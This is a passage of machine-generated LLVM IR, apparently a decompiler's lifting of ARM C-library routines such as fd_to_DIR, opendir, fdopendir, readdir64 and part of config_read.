  ret i32 %v7_13c54

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_13c58 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_13c6c = call i32 @malloc()
  %v2_13c74 = icmp eq i32 %v0_13c6c, 0
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r6, align 4
  br i1 %v2_13c74, label %bb, label %dec_label_pc_13c84

bb:                                               ; preds = %entry
  br label %dec_label_pc_13d10

dec_label_pc_13c84:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_13c88 = load i32, i32* @r4, align 4
  %v2_13c88 = icmp ugt i32 %v0_13c88, 511
  %v2_13c8c = add i32 %v0_13c6c, 4
  %v3_13c8c = inttoptr i32 %v2_13c8c to i32*
  store i32 0, i32* %v3_13c8c, align 4
  %v0_13c90 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c90 = add i32 %v0_13c6c, 16
  %v3_13c90 = inttoptr i32 %v2_13c90 to i32*
  store i32 %v0_13c90, i32* %v3_13c90, align 4
  %v0_13c94 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c94 = add i32 %v0_13c6c, 8
  %v3_13c94 = inttoptr i32 %v2_13c94 to i32*
  store i32 %v0_13c94, i32* %v3_13c94, align 4
  br i1 %v2_13c88, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_13c84
  %v0_13c9c2 = load i32, i32* @r4, align 4
  %v2_13c9c3 = add i32 %v0_13c6c, 20
  %v3_13c9c4 = inttoptr i32 %v2_13c9c3 to i32*
  store i32 %v0_13c9c2, i32* %v3_13c9c4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_13c84
  %v1_13c98 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c98 = add i32 %v1_13c98, 512
  store i32 %v2_13c98, i32* %r3.global-to-local, align 4
  %v0_13c9c = load i32, i32* @r4, align 4
  %v2_13c9c = add i32 %v0_13c6c, 20
  %v3_13c9c = inttoptr i32 %v2_13c9c to i32*
  store i32 %v0_13c9c, i32* %v3_13c9c, align 4
  %v1_13ca0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_13ca0, i32* %v3_13c9c, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_13c6c, i32* @r5, align 4
  %v0_13ca8 = load i32, i32* @r7, align 4
  %v2_13ca8 = inttoptr i32 %v0_13c6c to i32*
  store i32 %v0_13ca8, i32* %v2_13ca8, align 4
  %v0_13cac = load i32, i32* @r5, align 4
  %v1_13cac = add i32 %v0_13cac, 20
  %v2_13cac = inttoptr i32 %v1_13cac to i32*
  %v3_13cac = load i32, i32* %v2_13cac, align 4
  store i32 %v3_13cac, i32* %r1.global-to-local, align 4
  %v2_13cb4 = call i32 @calloc(i32 1, i32 %v3_13cac)
  %v2_13cb8 = icmp eq i32 %v2_13cb4, 0
  store i32 %v2_13cb4, i32* @r4, align 4
  %v1_13cc0 = load i32, i32* @r5, align 4
  %v2_13cc0 = add i32 %v1_13cc0, 12
  %v3_13cc0 = inttoptr i32 %v2_13cc0 to i32*
  store i32 %v2_13cb4, i32* %v3_13cc0, align 4
  br i1 %v2_13cb8, label %dec_label_pc_13cc8, label %dec_label_pc_13cd8

dec_label_pc_13cc8:                               ; preds = %bb17
  %v0_13cc8 = load i32, i32* @r5, align 4
  store i32 %v0_13cc8, i32* @r0, align 4
  %v0_13ccc = call i32 @free()
  %v0_13cd0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_13d10

dec_label_pc_13cd8:                               ; preds = %bb17
  %v0_13cdc = load i32, i32* @r6, align 4
  %v2_13cdc = add i32 %v0_13cdc, -33160
  store i32 %v2_13cdc, i32* %r3.global-to-local, align 4
  %v1_13ce4 = inttoptr i32 %v2_13cdc to i32*
  %v2_13ce4 = load i32, i32* %v1_13ce4, align 4
  %v3_13ce4 = add i32 %v0_13cdc, -33156
  %v4_13ce4 = inttoptr i32 %v3_13ce4 to i32*
  %v5_13ce4 = load i32, i32* %v4_13ce4, align 4
  store i32 %v5_13ce4, i32* %r1.global-to-local, align 4
  %v6_13ce4 = add i32 %v0_13cdc, -33152
  %v7_13ce4 = inttoptr i32 %v6_13ce4 to i32*
  %v8_13ce4 = load i32, i32* %v7_13ce4, align 4
  store i32 %v8_13ce4, i32* %r2.global-to-local, align 4
  %v9_13ce4 = add i32 %v0_13cdc, -33148
  %v10_13ce4 = inttoptr i32 %v9_13ce4 to i32*
  %v11_13ce4 = load i32, i32* %v10_13ce4, align 4
  store i32 %v11_13ce4, i32* %r3.global-to-local, align 4
  %v12_13ce4 = add i32 %v0_13cdc, -33144
  %v1_13cf0 = inttoptr i32 %v12_13ce4 to i32*
  %v2_13cf0 = load i32, i32* %v1_13cf0, align 4
  %v3_13cf0 = add i32 %v0_13cdc, -33140
  %v4_13cf0 = inttoptr i32 %v3_13cf0 to i32*
  %v5_13cf0 = load i32, i32* %v4_13cf0, align 4
  store i32 %v2_13cf0, i32* %stack_var_-32, align 4
  store i32 %v5_13ce4, i32* %r1.global-to-local, align 4
  store i32 %v8_13ce4, i32* %r2.global-to-local, align 4
  store i32 %v11_13ce4, i32* %r3.global-to-local, align 4
  %v0_13d00 = load i32, i32* @r5, align 4
  %v1_13d00 = add i32 %v0_13d00, 24
  %v1_13d04 = inttoptr i32 %v1_13d00 to i32*
  store i32 %v2_13ce4, i32* %v1_13d04, align 4
  %v3_13d04 = add i32 %v0_13d00, 28
  %v4_13d04 = inttoptr i32 %v3_13d04 to i32*
  %v5_13d04 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13d04, i32* %v4_13d04, align 4
  %v6_13d04 = add i32 %v0_13d00, 32
  %v7_13d04 = inttoptr i32 %v6_13d04 to i32*
  %v8_13d04 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_13d04, i32* %v7_13d04, align 4
  %v9_13d04 = add i32 %v0_13d00, 36
  %v10_13d04 = inttoptr i32 %v9_13d04 to i32*
  %v11_13d04 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_13d04, i32* %v10_13d04, align 4
  %v12_13d04 = add i32 %v0_13d00, 40
  %v2_13d08 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_13cf0, i32* %r1.global-to-local, align 4
  %v1_13d0c = inttoptr i32 %v12_13d04 to i32*
  store i32 %v2_13d08, i32* %v1_13d0c, align 4
  %v3_13d0c = add i32 %v0_13d00, 44
  %v4_13d0c = inttoptr i32 %v3_13d0c to i32*
  %v5_13d0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13d0c, i32* %v4_13d0c, align 4
  %v0_13d10.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13d10

dec_label_pc_13d10:                               ; preds = %bb, %dec_label_pc_13cc8, %dec_label_pc_13cd8
  %v0_13d10 = phi i32 [ 0, %bb ], [ %v0_13cd0, %dec_label_pc_13cc8 ], [ %v0_13d10.pre, %dec_label_pc_13cd8 ]
  store i32 %v12_13c58, i32* @r7, align 4
  ret i32 %v0_13d10

; uselistorder directives
  uselistorder i32 %v2_13cb4, { 1, 0, 2 }
  uselistorder i32 %v0_13c6c, { 3, 2, 6, 0, 5, 4, 1, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 5, 2, 6, 3, 7, 4, 8, 0, 9, 1, 10 }
  uselistorder label %dec_label_pc_13d10, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_13d30 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_13d60, label %dec_label_pc_13d48

dec_label_pc_13d48:                               ; preds = %entry
  %v0_13d4c = call i32 @__aeabi_read_tp()
  %v3_13d50 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13d50 = sext i16 %v3_13d50 to i32
  %v0_13d54 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d54 = sub i32 0, %v0_13d54
  store i32 %v1_13d54, i32* %r2.global-to-local, align 4
  %v3_13d58 = add i32 %v4_13d50, %v0_13d4c
  %v4_13d58 = inttoptr i32 %v3_13d58 to i32*
  store i32 %v1_13d54, i32* %v4_13d58, align 4
  br label %dec_label_pc_13d84

dec_label_pc_13d60:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_13d60 = icmp slt i32 %arg1, 0
  br i1 %v1_13d60, label %dec_label_pc_13d84, label %dec_label_pc_13d68

dec_label_pc_13d68:                               ; preds = %dec_label_pc_13d60
  store i32 %v2_13d30, i32* @r1, align 4
  %v0_13d6c = call i32 @fstat()
  %v1_13d70 = icmp slt i32 %v0_13d6c, 0
  br i1 %v1_13d70, label %dec_label_pc_13d78, label %dec_label_pc_13d8c

dec_label_pc_13d78:                               ; preds = %dec_label_pc_13d68
  br label %dec_label_pc_13d84

dec_label_pc_13d84:                               ; preds = %dec_label_pc_13d78, %dec_label_pc_13d60, %dec_label_pc_13d48
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13dd0

dec_label_pc_13d8c:                               ; preds = %dec_label_pc_13d68
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_13d94 = load i32, i32* @r7, align 4
  %v3_13d98 = call i32 @__GI___fcntl_nocancel(i32 %v0_13d94, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_13da0 = load i32, i32* @r7, align 4
  %v2_13da4 = call i32 @fd_to_DIR(i32 %v0_13da0, i32 %tmp)
  store i32 %v2_13da4, i32* %r1.global-to-local, align 4
  %v2_13da8 = icmp eq i32 %v2_13da4, 0
  br i1 %v2_13da8, label %dec_label_pc_13db0, label %dec_label_pc_13dd0

dec_label_pc_13db0:                               ; preds = %dec_label_pc_13d8c
  %v0_13dc0 = call i32 @__aeabi_read_tp()
  %v3_13dc4 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13dc4 = sext i16 %v3_13dc4 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_13dcc = add i32 %v4_13dc4, %v0_13dc0
  %v4_13dcc = inttoptr i32 %v3_13dcc to i32*
  store i32 12, i32* %v4_13dcc, align 4
  %v0_13dd0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13dd0

dec_label_pc_13dd0:                               ; preds = %dec_label_pc_13d8c, %dec_label_pc_13d84, %dec_label_pc_13db0
  %v0_13dd0 = phi i32 [ %v2_13da4, %dec_label_pc_13d8c ], [ 0, %dec_label_pc_13d84 ], [ %v0_13dd0.pre, %dec_label_pc_13db0 ]
  ret i32 %v0_13dd0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_13dd0, { 2, 0, 1 }
}

define i32 @"$d"(i32 %arg1) local_unnamed_addr {
dec_label_pc_13de0:
  %v0_13de0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13de0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13de0
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13de0, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_13df0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_13df0, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_13dfc = call i32 @fstat()
  store i32 %v0_13dfc, i32* @r5, align 4
  %v2_13e00 = icmp eq i32 %v0_13dfc, 0
  br i1 %v2_13e00, label %dec_label_pc_13e08, label %dec_label_pc_13e80

dec_label_pc_13e08:                               ; preds = %entry
  %v1_13e0c = and i32 %tmp4, 61440
  store i32 %v1_13e0c, i32* @r3, align 4
  %v7_13e10 = icmp eq i32 %v1_13e0c, 16384
  br i1 %v7_13e10, label %dec_label_pc_13e30, label %dec_label_pc_13e18

dec_label_pc_13e18:                               ; preds = %dec_label_pc_13e08
  %v0_13e1c = call i32 @__aeabi_read_tp()
  %v3_13e20 = load i16, i16* @global_var_20d6c.590, align 2
  %v0_13e24 = load i32, i32* @r5, align 4
  store i32 %v0_13e24, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e64

dec_label_pc_13e30:                               ; preds = %dec_label_pc_13e08
  %v0_13e30 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_13e38 = call i32 @__libc_fcntl(i32 %v0_13e30, i32 3)
  %v7_13e3c = icmp eq i32 %v2_13e38, -1
  br i1 %v7_13e3c, label %dec_label_pc_13e80, label %dec_label_pc_13e44

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13e30
  %v1_13e44 = urem i32 %v2_13e38, 4
  store i32 %v1_13e44, i32* %r3.global-to-local, align 4
  %v7_13e48 = icmp eq i32 %v1_13e44, 1
  br i1 %v7_13e48, label %dec_label_pc_13e50, label %dec_label_pc_13e6c

dec_label_pc_13e50:                               ; preds = %dec_label_pc_13e44
  %v0_13e54 = call i32 @__aeabi_read_tp()
  %v3_13e58 = load i16, i16* @global_var_20d6c.590, align 2
  %v0_13e5c = load i32, i32* @r5, align 4
  store i32 %v0_13e5c, i32* %r1.global-to-local, align 4
  %v0_13e60 = load i32, i32* %r3.global-to-local, align 4
  %v1_13e60 = add i32 %v0_13e60, 21
  br label %dec_label_pc_13e64

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e18, %dec_label_pc_13e50
  %v2_13e64.in = phi i16 [ %v3_13e20, %dec_label_pc_13e18 ], [ %v3_13e58, %dec_label_pc_13e50 ]
  %v1_13e64 = phi i32 [ %v0_13e1c, %dec_label_pc_13e18 ], [ %v0_13e54, %dec_label_pc_13e50 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_13e18 ], [ %v1_13e60, %dec_label_pc_13e50 ]
  %v2_13e64 = sext i16 %v2_13e64.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_13e64 = add i32 %v1_13e64, %v2_13e64
  %v4_13e64 = inttoptr i32 %v3_13e64 to i32*
  store i32 %storemerge, i32* %v4_13e64, align 4
  %v0_13e84.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e84

dec_label_pc_13e6c:                               ; preds = %dec_label_pc_13e44
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_13e70 = load i32, i32* @r4, align 4
  %v2_13e74 = call i32 @fd_to_DIR(i32 %v0_13e70, i32 %tmp)
  store i32 %v2_13e74, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e84

dec_label_pc_13e80:                               ; preds = %entry, %dec_label_pc_13e30
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e84

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e6c, %dec_label_pc_13e64, %dec_label_pc_13e80
  %v0_13e84 = phi i32 [ %v2_13e74, %dec_label_pc_13e6c ], [ %v0_13e84.pre, %dec_label_pc_13e64 ], [ 0, %dec_label_pc_13e80 ]
  ret i32 %v0_13e84

; uselistorder directives
  uselistorder i32 %v1_13e44, { 1, 0 }
  uselistorder i32 %v2_13e38, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 21, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %dec_label_pc_13e84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e80, { 1, 0 }
  uselistorder label %dec_label_pc_13e64, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r6, align 4
  %v1_13eb0 = add i32 %tmp, 24
  store i32 %v1_13eb0, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_13ec8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 112) to i32*), align 4
  store i32 %v4_13ec8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13ec8)
  %v0_13edc = load i32, i32* @r6, align 4
  %v2_13edc = add i32 %v0_13edc, 16
  %v3_13edc = inttoptr i32 %v2_13edc to i32*
  %v4_13edc = load i32, i32* %v3_13edc, align 4
  store i32 %v4_13edc, i32* %ip.global-to-local, align 4
  store i32 81640, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13edc)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_13eec

dec_label_pc_13eec:                               ; preds = %dec_label_pc_13f1c, %entry
  %v0_13eec = load i32, i32* @r5, align 4
  %v1_13eec = add i32 %v0_13eec, 4
  %v2_13eec = inttoptr i32 %v1_13eec to i32*
  %v3_13eec = load i32, i32* %v2_13eec, align 4
  %v4_13eec = add i32 %v0_13eec, 8
  %v5_13eec = inttoptr i32 %v4_13eec to i32*
  %v6_13eec = load i32, i32* %v5_13eec, align 4
  %tmp10 = icmp ugt i32 %v6_13eec, %v3_13eec
  br i1 %tmp10, label %dec_label_pc_13f1c, label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13eec
  %v1_13ef8 = inttoptr i32 %v0_13eec to i32*
  %v2_13ef8 = load i32, i32* %v1_13ef8, align 4
  %v1_13efc = add i32 %v0_13eec, 12
  %v2_13efc = inttoptr i32 %v1_13efc to i32*
  %v3_13efc = load i32, i32* %v2_13efc, align 4
  %v1_13f00 = add i32 %v0_13eec, 20
  %v2_13f00 = inttoptr i32 %v1_13f00 to i32*
  %v3_13f00 = load i32, i32* %v2_13f00, align 4
  %v4_13f04 = inttoptr i32 %v3_13efc to i32*
  %v5_13f04 = call i32 @__getdents64(i32 %v2_13ef8, i32* %v4_13f04, i32 %v3_13f00, i32 %v6_13eec)
  %tmp9 = icmp slt i32 %v5_13f04, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_13f14

.thread:                                          ; preds = %dec_label_pc_13ef8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13f4c

dec_label_pc_13f14:                               ; preds = %dec_label_pc_13ef8
  %v1_13f14 = load i32, i32* @r5, align 4
  %v2_13f14 = add i32 %v1_13f14, 8
  %v3_13f14 = inttoptr i32 %v2_13f14 to i32*
  store i32 %v5_13f04, i32* %v3_13f14, align 4
  %v0_13f18 = load i32, i32* @r7, align 4
  %v1_13f18 = load i32, i32* @r5, align 4
  %v2_13f18 = add i32 %v1_13f18, 4
  %v3_13f18 = inttoptr i32 %v2_13f18 to i32*
  store i32 %v0_13f18, i32* %v3_13f18, align 4
  %v0_13f1c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13f1c

dec_label_pc_13f1c:                               ; preds = %dec_label_pc_13eec, %dec_label_pc_13f14
  %v1_13f40 = phi i32 [ %v0_13eec, %dec_label_pc_13eec ], [ %v0_13f1c.pre, %dec_label_pc_13f14 ]
  %v1_13f1c = add i32 %v1_13f40, 4
  %v2_13f1c = inttoptr i32 %v1_13f1c to i32*
  %v3_13f1c = load i32, i32* %v2_13f1c, align 4
  %v1_13f20 = add i32 %v1_13f40, 12
  %v2_13f20 = inttoptr i32 %v1_13f20 to i32*
  %v3_13f20 = load i32, i32* %v2_13f20, align 4
  %v2_13f24 = add i32 %v3_13f20, %v3_13f1c
  store i32 %v2_13f24, i32* @r4, align 4
  %v3_13f28 = inttoptr i32 %v2_13f24 to i32*
  %v4_13f28 = load i32, i32* %v3_13f28, align 4
  %v1_13f2c = add i32 %v2_13f24, 4
  %v2_13f2c = inttoptr i32 %v1_13f2c to i32*
  %v3_13f2c = load i32, i32* %v2_13f2c, align 4
  %v1_13f30 = add i32 %v2_13f24, 16
  %v2_13f30 = inttoptr i32 %v1_13f30 to i16*
  %v3_13f30 = load i16, i16* %v2_13f30, align 2
  %v4_13f30 = zext i16 %v3_13f30 to i32
  %v1_13f34 = add i32 %v2_13f24, 8
  %v2_13f34 = inttoptr i32 %v1_13f34 to i32*
  %v3_13f34 = load i32, i32* %v2_13f34, align 4
  store i32 %v3_13f34, i32* %ip.global-to-local, align 4
  %v2_13f38 = add i32 %v4_13f30, %v3_13f1c
  %v2_13f3c = or i32 %v3_13f2c, %v4_13f28
  %v4_13f3c = icmp eq i32 %v2_13f3c, 0
  store i32 %v2_13f38, i32* %v2_13f1c, align 4
  %v0_13f44 = load i32, i32* %ip.global-to-local, align 4
  %v1_13f44 = load i32, i32* @r5, align 4
  %v2_13f44 = add i32 %v1_13f44, 16
  %v3_13f44 = inttoptr i32 %v2_13f44 to i32*
  store i32 %v0_13f44, i32* %v3_13f44, align 4
  br i1 %v4_13f3c, label %dec_label_pc_13eec, label %dec_label_pc_13f4c

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f1c, %.thread
  %v0_13f58 = load i32, i32* @r6, align 4
  %v2_13f58 = add i32 %v0_13f58, 44
  %v3_13f58 = inttoptr i32 %v2_13f58 to i32*
  %v4_13f58 = load i32, i32* %v3_13f58, align 4
  store i32 %v4_13f58, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13f58)
  %v0_13f64 = load i32, i32* @r4, align 4
  ret i32 %v0_13f64

; uselistorder directives
  uselistorder i32 %v2_13f24, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_13f40, { 1, 0 }
  uselistorder i32 %v6_13eec, { 1, 0 }
  uselistorder i32 %v0_13eec, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_13f1c, { 1, 0 }
}

define i32 @function_13f78(i32 %arg1) local_unnamed_addr {
dec_label_pc_13f78:
  %v0_13f78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13f78, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13f78
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13f78, %bb
  %v4_13f84 = phi i32 [ %arg1, %dec_label_pc_13f78 ], [ 0, %bb ]
  ret i32 %v4_13f84

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_13f88 = load i32, i32* @r4, align 4
  %v6_13f88 = load i32, i32* @r5, align 4
  %v9_13f88 = load i32, i32* @r6, align 4
  %v12_13f88 = load i32, i32* @r7, align 4
  %v15_13f88 = load i32, i32* @r8, align 4
  %v18_13f88 = load i32, i32* @sb, align 4
  %v21_13f88 = load i32, i32* @sl, align 4
  %v24_13f88 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_13f8c = icmp eq i32* %arg1, null
  store i1 %v2_13f8c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_13f8c, label %dec_label_pc_1429c, label %dec_label_pc_13fa4

dec_label_pc_13fa4:                               ; preds = %entry
  %v1_13fa4 = urem i32 %arg3, 256
  store i32 %v1_13fa4, i32* @sb, align 4
  %v1_13fa8 = and i32 %arg3, ptrtoint (i32* @global_var_ff00.28 to i32)
  %v3_13fac = udiv i32 %v1_13fa8, 256
  %v3_13fb0 = mul nuw nsw i32 %v1_13fa4, 4
  %v1_13fb8 = or i32 %v3_13fb0, 1
  %v1_13fc4 = and i32 %arg3, 131072
  %v1_13fc8 = add nsw i32 %v1_13fa4, -1
  %v1_13fd4 = and i32 %arg3, 262144
  store i32 %v1_13fd4, i32* %r2.global-to-local, align 4
  %v1_13fd8 = and i32 %arg3, 65536
  store i32 %v1_13fd8, i32* %r3.global-to-local, align 4
  store i32 %v1_13fd8, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_13fe8 = add i32 %arg4, 1
  store i32 %v1_13fe8, i32* @sl, align 4
  %v2_14160 = icmp eq i32 %v1_13fc4, 0
  %v1_141b8 = inttoptr i32 %arg2 to i32*
  %v2_141d0 = icmp eq i32 %v1_13fd4, 0
  br label %dec_label_pc_13fec

dec_label_pc_13fec:                               ; preds = %dec_label_pc_13fec.backedge, %dec_label_pc_13fa4
  %v2_14008 = phi i32 [ %v0_13fec.pre, %dec_label_pc_13fec.backedge ], [ %tmp, %dec_label_pc_13fa4 ]
  %v1_13fec = add i32 %v2_14008, 4
  %v2_13fec = inttoptr i32 %v1_13fec to i32*
  %v3_13fec = load i32, i32* %v2_13fec, align 4
  store i32 %v3_13fec, i32* %r3.global-to-local, align 4
  %v2_13ff0 = icmp eq i32 %v3_13fec, 0
  store i1 %v2_13ff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ff0, label %dec_label_pc_13ff8, label %dec_label_pc_14040

dec_label_pc_13ff8:                               ; preds = %dec_label_pc_13fec
  %v1_13ff8 = add i32 %v2_14008, 16
  %v2_13ff8 = inttoptr i32 %v1_13ff8 to i32*
  %v3_13ff8 = load i32, i32* %v2_13ff8, align 4
  store i32 %v3_13ff8, i32* %r3.global-to-local, align 4
  %v2_13ffc = icmp eq i32 %v3_13ff8, 0
  store i1 %v2_13ffc, i1* %cpsr_z.global-to-local, align 1
  %v1_14000 = add i32 %v2_14008, 8
  %v2_14000 = inttoptr i32 %v1_14000 to i32*
  %v3_14000 = load i32, i32* %v2_14000, align 4
  store i32 %v3_14000, i32* %r3.global-to-local, align 4
  br i1 %v2_13ffc, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_13ff8
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_13ff8, align 4
  %v0_1400c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_13ff8, %bb
  %v0_1400c = phi i32 [ %v0_1400c.pre, %bb ], [ %v3_14000, %dec_label_pc_13ff8 ]
  %v2_1400c = icmp eq i32 %v0_1400c, 0
  store i1 %v2_1400c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1400c, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_13fb8, i32* %r3.global-to-local, align 4
  %v2_14014 = load i32, i32* @r5, align 4
  %v3_14014 = add i32 %v2_14014, 8
  %v4_14014 = inttoptr i32 %v3_14014 to i32*
  store i32 %v1_13fb8, i32* %v4_14014, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_14018 = load i32, i32* @r5, align 4
  %v1_14018 = add i32 %v0_14018, 16
  %v2_14018 = inttoptr i32 %v1_14018 to i32*
  %v3_14018 = load i32, i32* %v2_14018, align 4
  store i32 %v3_14018, i32* %r0.global-to-local, align 4
  %v1_1401c = add i32 %v0_14018, 8
  %v2_1401c = inttoptr i32 %v1_1401c to i32*
  %v3_1401c = load i32, i32* %v2_1401c, align 4
  store i32 %v3_1401c, i32* %r3.global-to-local, align 4
  %v2_14020 = add i32 %v3_1401c, %v3_14018
  store i32 %v2_14020, i32* @r0, align 4
  %v0_14024 = call i32 @malloc()
  store i32 %v0_14024, i32* %r0.global-to-local, align 4
  %v2_14028 = icmp eq i32 %v0_14024, 0
  store i1 %v2_14028, i1* %cpsr_z.global-to-local, align 1
  %v1_1402c = load i32, i32* @r5, align 4
  %v2_1402c = add i32 %v1_1402c, 4
  %v3_1402c = inttoptr i32 %v2_1402c to i32*
  store i32 %v0_14024, i32* %v3_1402c, align 4
  br i1 %v2_14028, label %dec_label_pc_1429c, label %dec_label_pc_14034

dec_label_pc_14034:                               ; preds = %.thread
  %v0_14034 = load i32, i32* @r5, align 4
  %v1_14034 = add i32 %v0_14034, 20
  %v2_14034 = inttoptr i32 %v1_14034 to i32*
  %v3_14034 = load i32, i32* %v2_14034, align 4
  %v1_14038 = or i32 %v3_14034, 1
